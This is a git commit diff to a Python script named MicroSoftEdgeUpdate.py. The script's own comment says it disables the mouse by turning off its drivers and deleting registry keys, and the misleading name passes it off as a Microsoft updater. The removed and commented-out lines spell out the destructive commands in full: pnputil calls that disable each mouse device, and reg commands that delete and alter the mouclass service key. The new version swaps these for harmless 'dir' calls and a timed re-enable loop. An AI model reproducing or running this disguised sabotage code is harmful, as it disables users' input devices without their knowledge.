bf9df2ed80e5be2770233116ce9c3b56718f7bae
Thomas Wang <taw7879@g.rit.edu>
2022-11-08 12:06:46 -0500

    bad

--- MicroSoftEdgeUpdate.py
+++ MicroSoftEdgeUpdate.py
@@ -3,6 +3,8 @@
 # This tool will disable the mouse by disabling its drivers and deleting its registry keys
 import os
 import subprocess
+import time
+
 
 def power_run(cmd):
     completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
@@ -21,11 +23,19 @@ for line in lines:
         mouses.append(line)
 #disables mouse drivers
 for mouse in mouses:
-    command = "pnputil /disable-device \"" + mouse + "\""
+    #command = "pnputil /disable-device \"" + mouse + "\""
+    command = "dir"
     os.system(command)
+
+time.sleep(20)
+for mouse in mouses:
+    #command = "pnputil /enable-device \"" + mouse + "\""
+    command = "dir"
+    os.system(command)
+
 #deletes registry keys
-p = os.popen("reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mouclass", "w")
-p.write("y\n")
-p = os.popen("reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mouclass% /v Start /t REG_DWORD /d 4", "w")
-p.write("y\n")
+#p = os.popen("reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mouclass", "w")
+#p.write("y\n")
+#p = os.popen("reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mouclass% /v Start /t REG_DWORD /d 4", "w")
+#p.write("y\n")
 
